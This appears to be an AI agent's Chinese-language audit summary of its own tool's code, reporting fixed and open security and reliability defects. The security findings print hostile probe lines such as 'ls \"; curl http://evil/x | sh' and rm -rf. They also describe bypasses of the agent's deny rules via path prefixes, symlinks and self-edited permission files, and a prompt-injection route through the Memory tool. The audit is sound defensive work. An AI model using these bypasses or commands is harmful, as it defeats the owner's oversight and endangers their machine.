# 回溯审计汇总（2026-08-13）

用户要求：「以前的内容也评审一下 —— 我觉得开评审之后会改掉你很多问题，但是我以前都看不出来。」

六条独立子代理各审一条主线，每条都带死命令：**任何断言必须打出原文自证、能实测就实测、
不许为了凑数编造问题、查完干净就明说干净**。主线按**本项目历史上真咬过人的缺陷类型**切分，
不是按目录 —— 泛泛审一遍只会得到一堆「建议加强健壮性」。

报告里的每一条，我都用命令自己复核过才写进这份汇总；复核不过的不收录。

| 主线 | 覆盖 | 结论 |
|---|---|---|
| A 假绿测试 | 190 个测试文件全枚举，~120 个逐行读 | 2 条已修，一批待办 |
| B 注释 vs 实现 | ~90 条「声明不变量」的注释 | **87 条成立**，3 条已修 |
| C 死代码 | 全部 348 个源文件 + import 图 BFS | 8 条，已出处置判断 |
| D 权限与安全 | permission / auth / 各工具 | **1 条已修（严重）**，7 条待办 |
| E Web 可用性 | styles.css 全 916 行 + 真浏览器 | 6 条，1 条阻塞级 |
| F 子进程与编码 | 全部 spawn 点，多条真跑复现 | **1 条已修（严重）**，8 条待办 |

---

## 一、已修（8 条，全部带变异验证）

### 1. `splitBashCommand` 不认反斜杠转义 —— 默认配置下越权执行任意命令 【严重】

`af1e600`。**本轮最严重的一条，不需要任何前置条件。**

bash 里引号外的 `\"` 是字面量双引号、不进入引号态；而拆分器看到 `"` 就置引号态，
于是后面的 `;` 被当成「引号内的分隔符」不拆 —— **整条被当成一个子命令**，
逐子命令的 deny 与 allow 覆盖校验同时失效。

真跑（git-bash，本仓真正用的 shell）：

```
$ bash -c 'ls package.json \"; echo I_AM_THE_HIDDEN_COMMAND'
ls: cannot access '"': No such file or directory
package.json
I_AM_THE_HIDDEN_COMMAND          ← 藏的那条真的执行了
```

调真 `decide()`（修前）：

```
DENY  | "ls package.json ; echo HIDDEN"        matched=Bash(echo*)
ALLOW | "ls package.json \"; echo HIDDEN"      matched=-
纯默认配置（9 条 allow、0 条 deny、最严 default 档）：
ASK   | "rm -rf /tmp/x"
ALLOW | "cat README.md \"; rm -rf /tmp/x"
ALLOW | "ls \"; curl http://evil/x | sh"
```

23 项 bash 安全检查一条都没响 —— 它们查的是混淆特征，不是「拆分器与 bash 看法不一致」。
deny 表在**所有档位含 bypass** 一并失效。

**正确的转义状态机同一个包里就有**（`bash-security.ts` 一直是对的）：
两套扫描器对同一条命令有两种解释，而安全恰恰取决于看法一致。

修后同一探针：`ALLOW→DENY`、`ALLOW→ASK`、`ALLOW→ASK`。

### 2. `killTree` 的 spawn 失败会打死整个 daemon 【严重】

`771c4dc`。Windows 分支 `spawn('taskkill', …)` 没挂 `'error'`，而 POSIX 分支一直有 try/catch。

`spawn()` 启动失败时**同步不抛**、异步 emit `'error'`，无监听者时 Node 直接 throw。
而调用点全在定时器 / abort 回调里，那条栈上没有任何 catch，本仓也没有 process 级兜底。
**后果是整机级：所有会话一起没。**

> 测试写法上踩了一次：第一版拿一个不存在的 pid —— 那样 taskkill 会正常启动再报「找不到进程」，
> 走 exit 路径而不是 ENOENT 路径，**测不到要测的那条**。改成清空 PATH + SystemRoot 让
> spawn 本身失败，并自挂 `uncaughtException` 观测（vitest 有自己的钩子，断言拿不到），
> 还要等一拍 —— `'error'` 是异步事件，不等的话断言必然通过、什么也没测到。

### 3. 「全量测试」只跑 190 个文件里的 142 个

`21f3e06`。根 `vitest.config.ts` 两道口子叠在一起：`include` 不含 `.tsx`（web 的 31 个不匹配）、
`exclude` 又显式排掉 `packages/web/**`（剩下 17 个）。而 `CLAUDE.md` 把这条命令写成「全量测试」。

**web 的 48 个文件、545 条用例从来没进过门禁。** 加 `vitest.workspace.ts` 让两边各用各的配置
（web 要 jsdom + react 插件 + setupFiles，硬并成一个配置不行）。实测 142 → 190 文件。

### 4. iframe sandbox 的三条「安全锁」测试锁的是常量，不是 iframe

`21f3e06`。全仓 `sandbox` 只有三处命中：测试、一句注释、以及 `sandbox={SANDBOX_TOKENS}`
—— **没有任何地方读过 iframe 真实属性**。变异：把那一行整个删掉（权限最大化，
也就是注释里浏览器实测过的提权洞全开），三条安全测试**照样全绿**。

改成读真实属性，并补两条：**属性本身必须在**（原来两条是「不含 X」，属性整个消失时
空数组不含任何东西、反而全部成立，而属性消失恰恰是权限最大化）、常量与实际属性一致。

**3 和 4 是一对**：测得不对 + 跑都没跑，是同一个洞能一直隐形的两个原因。

### 5–8. 四条「注释没跟着代码走」

`9f3cdb4` + `e5adcca`。失效模式高度集中：**同一个概念在两处写，只改了一处。**

- `policy.ts` 的 `idleMs` 字段注释还写着「项目档 30 分钟」，而实际是 `null`，
  且**正上方**的 `PROJECT_POLICY` 文档块专门解释了为什么是 null。同一文件两段注释互相矛盾，
  而字段注释是 IDE 悬停看到的那份。
- 同一段取舍论证里「而片段档那边 `idleMs` 仍然开着」——**假的**，片段档也是 null。
  我的取舍论证建立在同一个文件里一个不成立的前提上。
- `run.ts` 把「因 30 分钟无输出被停止必须出现在 UI 上」写成一条在生效的需求 ——
  `'idle'` 在生产路径不可达（`armIdle()` 一进来就短路），UI 文案里也没有 30 分钟。
- `childEnv.ts` 的 `declared` 示例列了 `JAVA_TOOL_OPTIONS`，而上层明写「只给 Python 那两个，
  不给它」、CLAUDE.md 坑表也明令禁止。只读底层文档的人最自然的动作就是照着例子塞进去。

**采纳的结构性规矩**：具体数值只在定义那个常量的地方写一次，别处引用符号名、不复述数字。

---

## 二、1 级待办（有实跑反例，后果不可逆或整机级）

### D2 未鉴权的 `/api/auth/setup` + 全站无 Host/Origin 校验 → 开发机 RCE

daemon 未设密码时 setup 无任何来源校验；全站从不读 `req.headers.origin`/`host`
（非测试代码零命中）。`text/plain` + 无凭据 = CORS simple request，任意站点 `no-cors` 即可送达。
实跑：带 `Origin: https://evil.example` 的 setup/login 全部 200。

配合 DNS rebinding：恶意页面变同源 → `/api/auth/status` → setup → login →
`POST /api/runs`（任意命令）+ `PUT /api/files/content`（任意写盘）。
**从「访问一个网页」到「开发机 RCE」。** 默认绑 `127.0.0.1`，但 `--host` 存在且文档鼓励隧道远程访问。

**修法**：Host 白名单对所有请求生效（这一条就能杀掉 rebinding）；setup 要求同源 Origin；
`/ws` upgrade 加 Origin 校验（现在只靠 `SameSite=Lax` 单层）。

### D3 `\\?\` 扩展长度前缀绕过全部路径 deny

`matchPath` 拿 `resolve()` 结果做字面 glob 比对，`\\?\C:\…` 归一化后仍是 `//?/C:/…`，
与规则 `C:/…/**` 永不相交；而 `resolvePath` 原样交给 fs，Node 能正常打开。

实跑：`deny: Read(…/secretdir/**)` 下，直接读 DENY、加前缀 **ALLOW 且真读到了私钥内容**。
UNC 形态同样绕过。`deny: Read(~/.ssh/**)` —— **模块注释自己推荐的护私钥写法** —— 一个前缀就废。

### D4 权限层不做 realpath —— 符号链接绕过 deny 和 cwd 围栏

全仓非测试代码 `realpath` 零命中。实跑：cwd 内一个指向外部的 junction，
直接读 DENY、经 junction **ALLOW**，Write 同理。

**不需要模型先建链接 —— clone 一个不可信仓库即可**（git 能携带符号链接）；
此后 `Write(./**)` 这种「仅限本项目」的规则可写到 `~/.ssh/authorized_keys`。
注释里那道被称为「本函数安全核心」的 cwd 围栏，对任何含符号链接的仓库无效。

### F P1 后台孙进程握住管道 → `close` 永不到达

Bash 工具与 run 服务**都只监听 `close`**。`node x.js & echo done` 这类命令前台 shell 秒退，
孙进程继承 stdout 管道 → close 永远不来。实测：68ms 就完成的命令，12 秒时 CLOSE 一次都没出现。

三重后果：① Bash 工具白等满 120 秒，把一条成功的命令报成超时；
② 超时那刻 `killTree` 打在**已经死掉的 bash pid** 上，孙进程一个都收不掉
（正是 `bin.ts` 自己写下的「父进程一死进程树就断了」，从产品内部踩到）；
③ 项目档无墙钟无空闲 → run **永远停在 running**，永久占一个并发额度。

叠加 **F P5**（zombie 是终态、无人复核、`isLive` 把它算成活的）：攒够 8 次，
run 服务对整个 daemon 失效，只能重启。`maxConcurrent` 默认就是 8。

---

## 三、2 级待办（真问题，后果可控或需设计）

| # | 问题 | 要点 |
|---|---|---|
| E1 | **触屏上代码块「运行」按钮永久不可见、但可点** | `opacity:0` + `:hover` 显示，全仓无 `hover: hover` / `pointer: coarse` 回退。实测 iPhone 13 视口：opacity 0、`pointer-events auto`、73×21 命中区**盖在横向滚动区上** —— 想滑动看长代码行，静默启动一条命令。`.code-run` 是整个预览/执行功能的**唯一入口**，手机上永远看不见 |
| C1 | **hooks 子系统整个接不上，用户配置静默丢弃** | `settings.ts` 里 `hooks` 零命中，`mergeLayers` 是逐字段显式拷贝、没有那一行。**处置：删。** 现有实现用 `execSync`（一条 hook 最多同步阻塞整个 daemon 10 秒，冻的是所有会话），且项目层 `.zuse/settings.json` 会进 git —— clone 一个仓库就可能执行任意命令。不是「差一行就能用」，是方向已经判死的一版 |
| C2 | **删会话不杀 run，留永生孤儿** | 处置：接到 `delete()`，**不是** `release()`（后者有 cron 的两个纯归还调用方）。步骤 4 之后变严重：项目档无墙钟，孤儿 dev server 永远占端口且 UI 再也看不到 |
| D6 | **`parseRule` 不接受连字符 → MCP 工具的 deny 规则静默失效** | 正则是 `[A-Za-z_][A-Za-z0-9_]*`，而 MCP 工具名普遍带连字符。实跑：deny 一个带连字符的工具，bypass 档下 **ALLOW**。写错大小写/多个空格同理。全仓没有任何地方校验规则合法性 |
| D5 | **WebFetch 跟随重定向，限定符只看首个 URL** | 实跑：`deny: WebFetch(127.0.0.1)` 被一个 302 绕过，**输出里回显的还是原始 URL**，人审看不出去过哪。可打到 zuse 自己的 API、云元数据地址 |
| D7 | **默认 `Bash(echo *)` + 重定向不拆 → 可改写权限配置文件自我提权** | 实跑纯默认配置：`echo '{"permissions":{"defaultMode":"bypass"}}' > .zuse/settings.local.jsonc` **ALLOW**。护栏可自我拆除。注释承认了重定向问题，但没意识到这个后果 |
| D8 | **`Memory` 标 `readOnly` 但写的是未来所有会话的系统提示词** | default 档下不弹框。一次提示注入即可把「以后遇到 X 就执行 Y」写进机主所有后续会话 |
| F P6 | **LSP 的退出兜底是空操作** | `process.once('exit')` 里用 `setTimeout` —— 实测 exit 阶段 **microtask 跑、timer 不跑**。一个语言服务器都杀不掉。本机确实挂着 3 个 tsserver。正确写法同仓就有（`tmux-isolation.ts` 用 `spawnSync`） |
| F P7 | **MCP 的 `close()` 只杀最外层 cmd.exe** | 真实后代树是 4 层，`proc.kill()` 打的是第 1 层。实测：孙进程不读 stdin 时留孤儿。**今天不留孤儿是因为 MCP server 恰好实现了 stdin EOF 自退**，不是这段代码做对了 |
| F P2 | **daemon 崩溃时安静的长跑子进程成为永久孤儿** | 实测：`taskkill /F` 父进程后，**一直打印的子进程反而死了**（EPIPE 自杀），安静的活着。而项目档的典型形态恰恰是安静的（实测 `vite dev` 启动后 23915ms 不吐一个字节）—— 最该被兜住的正好兜不住。真解是 Windows Job Object |

---

## 四、3 级（已记录，不急）

- **E2** 精简视图开关的 `.icon-btn.on` **无对应 CSS 规则** —— 两态只差一个字形（`◧`/`▤`），
  实测像素差异 4.1%，对比度 2.57:1
- **E3** `--hover` / `--fg` / `--danger` **三个 CSS 变量从未定义**。
  暗色主题下运行菜单 hover 高亮对比度 **1.013:1**（看不见）。
  而 `.run-menu-item { color: var(--fg) }` —— 上一轮修白字白底加的那行 —— 因变量不存在
  而 fallback 到 inherit，**碰巧落在正确的颜色上**：它工作，但是靠运气
- **E4** `--faint` 在亮色主题下系统性 2.26–2.57:1（约 25 条规则，含**空状态首屏文案**、
  代码注释、占位符）。最坏是 `.msg-copy` 的 `opacity:.6` 叠加后 **1.69:1**
- **E5** 运行菜单 / ModelPicker / DirPicker **Esc 关不掉**；
  全站**没有任何模态做焦点陷阱或焦点还原**（含声明了 `aria-modal="true"` 的 ConfirmDialog）
- **C3–C8** `reset-session` 整条 WS 路径（45 行 + 12 处测试，前端根本不发）、
  `/api/auth/logout` 无客户端、`setPermissionPolicy`（**是个陷阱**：它替换 policy 对象，
  而注释明写那个别名关系是刻意的）、`markTitleSettled`、`workflow.ts`（291 行 + 570 行测试的
  闭合孤岛，且与 `agent-tool.ts` 有逐字重复的分叉副本）、`ProviderConfig.models`
  （**是已知生产事故的复现器**：它是未过滤的那一份，却挂在最权威的对象上）
- **A 的其余假绿**：路径穿越测试的 `..` 被 WHATWG URL 客户端归一化掉、
  hook 匹配测试改成 `return true` 仍全绿、Java stderr 编码 e2e 删掉那个 flag 仍全绿
  （解码器自动探测，U+FFFD 两边都是 0）、**四个验证脚本无论成败都 exit 0**、
  两个测试文件只 import 类型（运行期零覆盖）

---

## 五、这轮最值得记住的三件事

1. **「测试绿 ≠ 能用」有了新的一类标本。** 前面几轮是行为不对、是用户看不见；
   这轮是**测试断言的对象根本不是被保护的那个东西**（锁常量不锁 iframe），
   以及**门禁压根没跑那些测试**。两者叠加，一个有完整文档、有专门 describe 的
   「安全锁」可以在零保护状态下常绿。

2. **注释可信度 87/90，但失效模式高度可预测：同一个概念在两处写，只改一处。**
   这条已经变成代码规矩写进了 `policy.ts`。

3. **子进程「起」做到 9 分，「收尾」大概 5 分。** 三个根因是同一个：
   只信 `close` 不信 `exit`、退出路径上用异步/定时器（exit 阶段不跑）、
   除 run 服务外没人用 `killTree`。这个断层解释了 F 的一大半条目。

## 六、方法说明（供下次复用）

有效的部分：

- **按缺陷类型切分主线，不按目录。** 每条主线给一个**真实的历史标本**当模式参考
  （`ping` 那条假绿、`onDetach` 那条死代码、白字白底），代理才知道要找的是什么形状。
- **死命令：不许凑数、查完干净就明说干净。** 六份报告都有明确的「我查过并认为没问题」小节，
  这比多报几条水货有价值 —— 它让复核有边界。
- **强制实测。** 六条里价值最高的几条全部来自实跑：转义越权、`\\?\` 真读到私钥、
  junction 绕围栏、exit 阶段 timer 不跑、close 永不到达、真浏览器量对比度。
  纯推理的条目在复核时明显更容易站不住。
- **拿真实现跑反例，不要自己重写一份。** 重写一份只能验证「我的理解」，验证不了实现。

要注意的：

- 报告里的行号/结论仍需自己复核一遍再动手 —— 本轮全部复核通过，但这是运气好，不是规律。
- 代理会在 scratchpad 留下探针脚本；有一个还在仓库根留了个 0 字节的 `{}`（shell 重定向残留）。
